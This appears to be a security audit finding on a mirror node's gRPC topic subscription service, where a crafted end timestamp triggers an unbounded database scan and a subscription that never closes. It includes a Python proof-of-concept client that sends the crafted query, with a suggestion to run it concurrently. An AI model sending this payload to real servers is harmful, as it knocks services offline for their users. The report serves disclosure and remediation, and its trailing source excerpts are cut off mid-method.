# Audit Report

## Title
Unbounded Topic Message Scan via Crafted Timestamp in `convertTimestamp()` Enabling Resource Exhaustion

## Summary
An unauthenticated caller can craft a `ConsensusTopicQuery` with `consensusEndTime.seconds >= 9223372035` to force `endTime = Long.MAX_VALUE`. All existing validators pass for this input. The result is a full paginated DB scan of every stored message for the targeted topic, followed by an indefinitely held live gRPC subscription, with no server-side enforcement to cap either.

## Finding Description

**Root cause — `convertTimestamp()` in `ConsensusController.java` lines 76–81:**

```java
private long convertTimestamp(Timestamp timestamp) {
    if (timestamp.getSeconds() >= 9223372035L) {
        return Long.MAX_VALUE;
    }
    return DomainUtils.timestampInNanosMax(timestamp);
}
```

Setting `consensusEndTime.seconds = 9223372035` satisfies the `>=` condition and returns `Long.MAX_VALUE` (`9223372036854775807`) as `endTime`. [1](#0-0) 

**Why validation does not block this — `TopicMessageFilter.java` lines 43–51:**

- `isValidEndTime()`: requires `endTime > startTime`. With `startTime=0` and `endTime=Long.MAX_VALUE`, the check is `Long.MAX_VALUE > 0` → **passes**.
- `isValidStartTime()`: requires `startTime <= DomainUtils.now()`. With `startTime=0`, the check is `0 <= now` → **passes**.

No constraint bounds the magnitude of the time window or the absolute value of `endTime`. [2](#0-1) 

**Database query impact — `TopicMessageRepositoryCustomImpl.java` lines 38–60:**

The JPA predicate becomes `consensus_timestamp >= 0 AND consensus_timestamp < Long.MAX_VALUE`. Because `limit=0` means `hasLimit()` returns `false`, `typedQuery.setMaxResults()` is never called. `getResultList()` then loads **all** matching rows for the topic into memory in a single call. [3](#0-2) 

**Indefinite live subscription — `TopicMessageServiceImpl.java` lines 123–131 and 203–215:**

`pastEndTime()` terminates the live stream only when `isComplete()` returns `true`. `isComplete()` evaluates:

```java
return Instant.ofEpochSecond(0, filter.getEndTime())
        .plus(grpcProperties.getEndTimeInterval())
        .isBefore(Instant.now());
```

`Instant.ofEpochSecond(0, Long.MAX_VALUE)` normalises to approximately year 2262. This condition is never `true` in practice, so `pastEndTime()` never completes, and the live subscription is held open indefinitely. [4](#0-3) [5](#0-4) 

**No subscriber cap — `TopicMessageServiceImpl.java` lines 48–55 and 89–90:**

`subscriberCount` is a Micrometer gauge for observability only. There is no enforcement path that rejects or throttles new subscriptions based on this counter. [6](#0-5) 

## Impact Explanation

Each malicious subscription causes two compounding resource drains:

1. **Full DB scan loaded into memory**: `getResultList()` with no `setMaxResults()` fetches every stored message for the topic in one call. On a high-volume topic this saturates DB I/O and JVM heap.
2. **Indefinite gRPC connection**: The reactive pipeline, thread scheduler slot, and DB listener registration are held open until the client disconnects. Multiple concurrent subscriptions multiply both effects.

The `subscriberCount` gauge provides visibility but no protection. Severity is **Medium** (griefing/DoS; no data exfiltration or economic theft beyond what is already publicly readable). [7](#0-6) 

## Likelihood Explanation

The `subscribeTopic` gRPC endpoint is publicly accessible with no authentication. The attack requires only a valid `topicId` (discoverable from public REST APIs) and a single crafted protobuf message. It is trivially repeatable and parallelisable from a single client with no on-chain transactions or special privileges. [8](#0-7) 

## Recommendation

1. **Bound `endTime` in `convertTimestamp()`**: Rather than mapping near-overflow seconds to `Long.MAX_VALUE`, reject or clamp the value to a configurable maximum future offset (e.g., `now + 30 days` in nanoseconds). [1](#0-0) 

2. **Add a `@Max` or custom validator on `endTime` in `TopicMessageFilter`**: Enforce a maximum allowed time window (e.g., `endTime - startTime <= MAX_WINDOW_NS`) as a bean-validation constraint. [2](#0-1) 

3. **Always set `setMaxResults()`**: In `findByFilter()`, apply a hard server-side page cap even when `filter.hasLimit()` is false, using the configured `maxPageSize`. [9](#0-8) 

4. **Enforce a concurrent-subscriber limit**: Reject new subscriptions when `subscriberCount` exceeds a configurable threshold, returning `RESOURCE_EXHAUSTED` to the caller. [6](#0-5) 

## Proof of Concept

```python
import grpc
from com.hedera.mirror.api.proto import consensus_pb2, consensus_pb2_grpc
from com.hederahashgraph.api.proto.java import basic_types_pb2, timestamp_pb2

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_pb2_grpc.ConsensusServiceStub(channel)

request = consensus_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=TARGET_TOPIC_ID),
    consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
    consensusEndTime=timestamp_pb2.Timestamp(seconds=9223372035, nanos=0),
    limit=0,  # no limit
)

# Forces: endTime = Long.MAX_VALUE, startTime = 0
# Result: full DB scan of all messages + indefinite live subscription
for response in stub.subscribeTopic(request):
    pass  # drain indefinitely
```

Sending this request concurrently from multiple goroutines/threads multiplies DB read load and connection count with no server-side throttle. [10](#0-9)

    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));

    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)

    }
